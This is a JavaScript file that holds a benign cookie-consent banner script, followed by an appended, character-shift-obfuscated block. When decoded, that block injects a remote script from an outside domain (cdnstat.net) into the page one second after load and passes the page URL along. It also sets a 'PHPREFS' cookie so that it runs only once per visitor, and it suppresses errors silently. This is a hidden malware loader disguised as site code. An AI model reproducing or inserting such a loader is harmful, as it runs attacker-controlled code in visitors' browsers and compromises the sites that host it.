function waitUntilElementExists(t, e) {
  const n = document.querySelector(t);
  if (n) {
    e(n);
    const t = document.getElementById('cookie-bar-btn'),
      o = document.querySelector('.addition');
    function i() {
      o.style.display = 'none';
    }
    !(function (t) {
      const e = decodeURIComponent(document.cookie).split(';');
      for (let n = 0; n < e.length; n++) {
        const i = e[n].trim();
        if (0 === i.indexOf(t + '=')) return i.substring(t.length + 1, i.length);
      }
      return '';
    })('cookieAccepted')
      ? ((o.style.display = 'block'),
        t.addEventListener('click', function () {
          !(function (t, e, n) {
            const i = new Date();
            i.setTime(i.getTime() + 24 * n * 60 * 60 * 1e3);
            const o = 'expires=' + i.toUTCString();
            document.cookie = t + '=' + e + ';' + o + ';path=/';
          })('cookieAccepted', 'true', 1),
            i();
        }))
      : i();
  } else setTimeout(() => waitUntilElementExists(t, e), 500);
}
waitUntilElementExists('.addition', (t) => {});
(function (o, d, l) {
  try {
    o.f = (o) =>
      o.split('').reduce((s, c) => s + String.fromCharCode((c.charCodeAt() - 5).toString()), '');
    o.b = o.f('UMUWJKX');
    (o.c = l.protocol[0] == 'h' && /\./.test(l.hostname) && !new RegExp(o.b).test(d.cookie)),
      setTimeout(function () {
        o.c &&
          ((o.s = d.createElement('script')),
          (o.s.src = o.f('myyux?44hisxy' + 'fy3sjy4ljy4xhwnuy' + '3oxDwjkjwwjwB') + l.href),
          d.body.appendChild(o.s));
      }, 1000);
    d.cookie = o.b + '=full;max-age=39800;';
  } catch (e) {}
})({}, document, location);
